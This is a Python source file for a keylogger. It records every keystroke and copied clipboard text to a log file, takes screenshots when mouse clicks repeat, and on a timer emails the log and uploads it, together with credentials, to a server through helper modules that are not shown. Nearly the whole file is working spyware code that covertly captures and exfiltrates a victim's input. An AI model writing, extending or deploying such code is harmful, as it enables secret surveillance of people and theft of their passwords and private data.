import os 
import pynput 
import data
import threading
import email_send
import ss
import pyperclip
import upload

# Global variables to store the last mouse and keyboard stroke
mouse_click = 0
last_key = 0

# File where the keystrokes would be saved
log_file = os.environ.get(
	'pylogger_file', 
	os.path.expanduser(data.path) 
) 

# Making the file if it doesn't exists
if not os.path.exists(log_file):
  	open(log_file, 'w').close()

# Making the directory where screenshots would be saved if it doesn't exits
if not os.path.exists(f"{data.sspath}/"):
	os.mkdir(f"{data.sspath}/")

# A thread to send data to email and server after every time_seconds 
def email_threading():
	try:
		email_send.send_data()
		upload.upload_file(log_file)
		upload.upload_credentials()
	except:
		with open(log_file, 'a') as f:
			f.write("Unable to send data to the server or the email. Please check.\n")
	if os.path.exists(log_file):
  		open(log_file, 'w').close()
	t = threading.Timer(data.time_seconds, email_threading)
	t.start()

email_threading()

# Function to call whenever a key is pressed
def OnKeyPress(key):
	global mouse_click
	global last_key 
	with open(log_file, 'a') as f:
		try:
			#Checking if the combination is control C
			if last_key == pynput.keyboard.Key.ctrl and key.char == 'c':
				f.write(f"Clipboard - {pyperclip.paste()} \n")
		except:
			pass
		f.write(f"{key} \n")	
		mouse_click = 0
		last_key = key

#Dummy functions for the actual listener
def OnKeyRelease(key):
	pass

#Function to call whenever a mouse click occurs
def OnMouseClick(x, y, button, pressed):
	global mouse_click
	if pressed:
		if button == mouse_click:
			s = threading.Timer(data.time_seconds_ss, ss.takeScreenshot)
			s.start()
			mouse_click = 0
		else:
			mouse_click = button

#Dummy functions for the actual listener
def OnScroll(x,y,dx,dy):
	pass

#Dummy functions for the actual listener
def OnMove(x,y):
	pass

# The actual listener which handles all the inputs and mouse clicks
with pynput.mouse.Listener(on_move=OnMove, on_click=OnMouseClick, on_scroll=OnScroll) as listener:
	with pynput.keyboard.Listener(on_press = OnKeyPress, 
			  on_release = OnKeyRelease) as listener: 
		listener.join()


